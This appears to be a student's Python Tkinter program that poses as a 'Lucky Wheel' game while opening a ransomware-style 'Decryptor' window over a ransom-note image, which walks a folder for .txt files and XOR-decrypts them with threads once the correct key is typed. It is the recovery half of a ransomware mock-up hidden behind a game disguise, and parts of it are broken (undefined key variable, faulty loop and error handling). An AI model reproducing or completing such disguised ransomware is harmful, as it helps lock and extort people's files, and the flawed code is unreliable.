root=Tk()
root.geometry('500x600+500+100')
root.minsize(500,600)
root.maxsize(500,600)
root.title('Lucky Wheel')
root.configure(bg='Sky blue')

pic = PhotoImage(file='E:\Python Semester 2\Assignment\Ransom\spin1.png')

f1=font.Font(family='Serif',size='30')
f2=font.Font(family='Serif',size='10')
f3=font.Font(family='Serif',size='20')

def decryption():
    def decryptor():
        def decrypt(key):
            try: 
                if key == keys3: 
                    while q.not_empty:
                        file = q.get()
                        index = 0
                        max_index = len(key) - 1
                        try:
                            with open(file, 'rb') as f:
                                data = f.read()
                            with open(file, 'w') as f:
                                f.write('')
                                for byte in data:
                                    xor_byte = byte ^ ord(key[index])
                                    with open(file, 'ab') as f:
                                        f.write(xor_byte.to_bytes(1, 'little'))
                                    if index >= max_index:
                                        index = 0 
                                    else: 
                                        index += 1
                        except:
                            msg = 'Failed to decrypt.'
                        q.task_done()
                else:
                    msg = 'Wrong decryption Key.'
                    messagebox.showerror('Info', msg)
            except ValueError:
                msg = 'Wrong Decryption Key.'
            messagebox.showerror('Info', msg)

        encrypted_ext = ('.txt',)
        file_paths = []
        for root, dirs, files in os.walk("E:\Python Semester 2\Assignment"):
            for file in files:
                file_path, file_ext = os.path.splitext(root+'\\'+file)
                if file_ext in encrypted_ext:
                    file_paths.append(root+'\\'+file)

        key = num_from.get()

        q =queue.Queue()
        for file in file_paths:
            q.put(file)

        for i in range(10):
            thread = threading.Thread(target=decrypt, args=(key,), daemon=True)
            thread.start()

        q.join()

    image = Image.open("ransom.png")
    pic = image.resize((500, 600))
    pic.save('ransom1.png') 

    root2=Toplevel()
    root2.geometry('500x600+500+100')
    root2.minsize(500,600)
    root2.maxsize(500,600)
    root2.title('Decryptor')


    photo = PhotoImage(file='ransom1.png')

    f3=font.Font(family='Serif',size='20')

    l1 = Label(root2, image=photo)
    l1.image = photo
    l1.pack()

    num=StringVar()
    num_from=Entry(root2,width=40,textvariable= num,font=("Times New Roman", 16))
    num_from.place(relx='0.51',rely='0.65',anchor='center')

    convert=Button(root2,text='Decrypt',bg='#c8cfde', command=decryptor)
    convert['font']=f3

    convert.place(relx='0.40',rely='0.7')

    root.mainloop()